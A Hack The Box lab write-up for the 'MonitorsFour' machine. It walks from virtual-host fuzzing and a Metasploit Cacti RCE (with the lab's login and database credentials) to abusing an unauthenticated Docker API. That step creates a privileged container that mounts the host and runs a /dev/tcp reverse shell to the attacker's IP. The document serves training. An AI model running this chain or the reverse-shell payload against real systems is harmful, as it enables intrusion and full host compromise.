
# MonitorsFour — Hack The Box Writeup

## Overview

**Target:** MonitorsFour HTB machine
**IP:** `10.129.56.39`
**Difficulty:** Medium (depending on familiarity with Docker internals)

---

# Reconnaissance

## Nmap Scan

```bash
nmap -sC -sV -Pn 10.129.56.39
```

### Output

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0

http-title: MonitorsFour - Networking Solutions
```

## Initial Observations

* Port `80` exposed a web application
* Port `5985` exposed WinRM
* WinRM required credentials, so web enumeration became priority

---

# Virtual Host Enumeration

The application used virtual hosts.

Initial wildcard responses returned:

* `302`
* Redirect → `http://monitorsfour.htb`
* Response size: `138`

### VHOST Fuzzing

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
-u http://10.129.56.39 \
-H "Host: FUZZ.monitorsfour.htb" \
-mc all \
-fs 138 \
-s
```

### Discovered Subdomain

```text
cacti
```

Added to hosts file:

```bash
echo "10.129.56.39 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

---

# Directory Enumeration

Root redirected everything to `/cacti`.

```bash
gobuster dir \
-u http://cacti.monitorsfour.htb/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-b 302
```

Discovered:

```text
/cacti
```

---

# Cacti Version Discovery

The target was running:

Cacti version:

```text
1.2.28
```

---

# Initial Access

Used Metasploit module:

```text
exploit/multi/http/cacti_graph_template_rce
```

### Metasploit Setup

```bash
use exploit/multi/http/cacti_graph_template_rce

set RHOSTS 10.129.56.39
set VHOST cacti.monitorsfour.htb
set TARGETURI /cacti

set USERNAME marcus
set PASSWORD wonderful1

set LHOST 10.10.16.176
set LPORT 4444

run
```

---

# Shell Access

Successful shell:

```text
meterpreter x64/linux
www-data@821fbd6a43fa.localdomain
```

System info:

```text
Debian 13.1
Linux 6.6.87.2-microsoft-standard-WSL2
```

This strongly suggested:

* Docker
* WSL2
* Windows backend host

---

# User Flag

Spawned shell:

```bash
shell
```

Located user flag:

```bash
find / -name user.txt 2>/dev/null
```

Found:

```text
/home/marcus/user.txt
```

---

# Container Enumeration

## Network Info

```bash
ip addr
```

Container IP:

```text
172.18.0.3
```

## Routes

```bash
ip route
```

Output:

```text
default via 172.18.0.1
172.18.0.0/16 dev eth0
```

This confirmed Docker bridge networking.

---

# Database Enumeration

Located config file:

```bash
cat /var/www/html/cacti/include/config.php
```

Recovered credentials:

```php
$database_hostname = 'mariadb';
$database_username = 'cactidbuser';
$database_password = '7pyrf6ly8qx4';
```

At this stage I initially pursued MariaDB pivoting.

This turned out to be unnecessary.

---

# Discovering Docker API

Attempted:

```bash
curl http://host.docker.internal:2375/version
```

Failed.

Then scanned Docker Desktop subnet:

```bash
for i in $(seq 1 254); do
curl -s --connect-timeout 1 http://192.168.65.$i:2375/version >/dev/null \
&& echo "Docker API found at 192.168.65.$i"
done
```

Discovered:

```text
192.168.65.7
```

---

# Verifying Docker API Exposure

```bash
curl http://192.168.65.7:2375/version
```

Confirmed exposed unauthenticated Docker Engine API.

---

# Creating Privileged Container

Started listener on attacker machine:

```bash
nc -lvnp 4449
```

Created malicious container:

```bash
curl -X POST -H "Content-Type: application/json" \
http://192.168.65.7:2375/containers/create \
-d '{
  "Image":"docker_setup-nginx-php",
  "Cmd":["/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.176/4449 0>&1"],
  "HostConfig":{
    "Binds":["/:/host"],
    "Privileged":true
  },
  "Tty": true,
  "AttachStdin": true,
  "AttachStdout": true,
  "AttachStderr": true,
  "OpenStdin": true
}'
```

Returned container ID:

```text
2fbfe038fe452aecfb49ca796b758a90a544fe06843240bd0508d846f03a02e0
```

Started container:

```bash
curl -X POST \
http://192.168.65.7:2375/containers/2fbfe038fe452aecfb49ca796b758a90a544fe06843240bd0508d846f03a02e0/start
```

---

# Root Shell

Listener received:

```text
root@container:/var/www/html#
```

Verified:

```bash
id
```

Output:

```text
uid=0(root)
```

---

# Root Flag

The host filesystem was mounted at:

```text
/host
```

Windows filesystem path:

```text
/host/mnt/host/c/
```

Located root flag:

```bash
cat /host/mnt/host/c/Users/Administrator/Desktop/root.txt
```

---

# Attack Chain Summary

```text
Web Enumeration
→ Virtual Host Discovery
→ Cacti RCE
→ Container Foothold
→ Internal Network Enumeration
→ Exposed Docker API Discovery
→ Privileged Container Escape
→ Windows Host Filesystem Access
→ Root Flag
```

---

# Lessons Learned

### Always enumerate virtual hosts

Wildcard redirects can hide important subdomains.

### Containers are rarely the final destination

A shell inside a container ≠ root.

### Pay attention to environmental clues

This was huge:

```text
microsoft-standard-WSL2
```

That hinted at Windows + Docker Desktop.

### Check internal services

The real privesc path was not externally exposed.

### Unauthenticated Docker APIs are catastrophic

Full host compromise with minimal effort.

---

# Final Thoughts

This was a very realistic modern environment:

* Web app exploitation
* Container compromise
* Internal infrastructure abuse
* Windows/Docker hybrid architecture

Excellent box for learning modern post-exploitation techniques.
